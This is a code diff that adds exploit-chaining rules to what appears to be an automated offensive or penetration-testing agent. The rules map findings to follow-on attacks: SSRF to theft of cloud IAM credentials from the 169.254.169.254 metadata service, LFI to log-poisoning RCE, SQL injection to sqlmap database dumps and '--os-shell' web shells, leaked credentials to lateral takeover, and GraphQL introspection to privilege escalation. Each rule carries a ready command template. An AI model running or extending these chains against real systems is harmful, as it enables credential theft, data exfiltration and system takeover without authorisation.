@@ -183,6 +183,95 @@ def _r_secret_pivot(state):
     }
 
 
+@rule(
+    "ssrf_to_cloud_metadata",
+    "SSRF finding → probe Cloud IMDS / metadata endpoints",
+    "EXPLOIT: curl|<ssrf_url>|-s -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' -X PUT http://169.254.169.254/latest/api/token",
+)
+def _r_ssrf_cloud_metadata(state):
+    ssrf = _has_finding(state, "ssrf") or _has_finding(state, "server-side request")
+    if not ssrf:
+        return None
+    return {
+        "from": "SSRF vulnerability",
+        "to": "cloud metadata (IMDS)",
+        "template": "COMMAND: curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' -m 5",
+        "why": "SSRF confirmed → extract cloud IAM credentials / service tokens",
+    }
+
+
+@rule(
+    "lfi_to_rce",
+    "LFI finding → Log poisoning or session file inclusion to RCE",
+    "EXPLOIT: curl|<lfi_url>?page=/var/log/apache2/access.log|",
+)
+def _r_lfi_to_rce(state):
+    lfi = _has_finding(state, "lfi") or _has_finding(state, "path traversal") or _has_finding(state, "local file")
+    if not lfi:
+        return None
+    return {
+        "from": "LFI / traversal",
+        "to": "RCE via log/session poisoning",
+        "template": "SEARCH: lfi log poisoning apache nginx proc environ php session rce",
+        "why": "LFI confirmed → poison access logs or session file with PHP code to achieve RCE",
+    }
+
+
+@rule(
+    "sqli_to_rce_or_dump",
+    "SQL injection finding → sqlmap dump or INTO OUTFILE webshell",
+    "EXPLOIT: sqlmap|<vuln_url>|--batch --dbs",
+)
+def _r_sqli_to_rce(state):
+    sqli = _has_finding(state, "sqli") or _has_finding(state, "sql injection")
+    if not sqli:
+        return None
+    return {
+        "from": "SQL injection",
+        "to": "database dump / webshell",
+        "template": "EXPLOIT: sqlmap|<vuln_url>|--batch --current-db --dump",
+        "why": "SQLi confirmed → extract entire database or drop web shell via --os-shell",
+    }
+
+
+@rule(
+    "config_leak_to_takeover",
+    "Leaked configuration / .env / credentials → database / service lateral takeover",
+    "PIVOT: <db_host>|<leaked_creds>",
+)
+def _r_config_leak_takeover(state):
+    env_leak = _has_finding(state, ".env") or _has_finding(state, "config") or _has_finding(state, "credentials")
+    creds = state.get("creds", [])
+    if not (env_leak or creds):
+        return None
+    return {
+        "from": "exposed config / credentials",
+        "to": "infrastructure / database takeover",
+        "template": "PIVOT: <host>|<user:pass>",
+        "why": "Exposed config / creds → connect directly to database, SSH, or administrative interfaces",
+    }
+
+
+@rule(
+    "graphql_to_privesc",
+    "GraphQL endpoint / introspection → mutation privilege escalation",
+    "GRAPHQL: <graphql_url>|{\"query\":\"{__schema{mutationType{fields{name}}}}\"}",
+)
+def _r_graphql_privesc(state):
+    gql = _has_finding(state, "graphql")
+    gql_eps = [e for e in state.get("endpoints", []) if "graphql" in e.get("url", "").lower()]
+    if not (gql or gql_eps):
+        return None
+    target_url = gql_eps[0]["url"] if gql_eps else "<graphql_url>"
+    return {
+        "from": "GraphQL endpoint",
+        "to": "mutation privilege escalation / ATO",
+        "template": f"GRAPHQL: {target_url}|{{\"query\":\"{{__schema{{mutationType{{fields{{name}}}}}}}}\"}}",
+        "why": "GraphQL active → inspect mutations for user creation, password reset, or privilege assignment",
+    }
+
+
+
 def find_chains(state):
     """Run all rules. Returns list of chain dicts that haven't already fired."""
     existing = state.setdefault("chains", [])
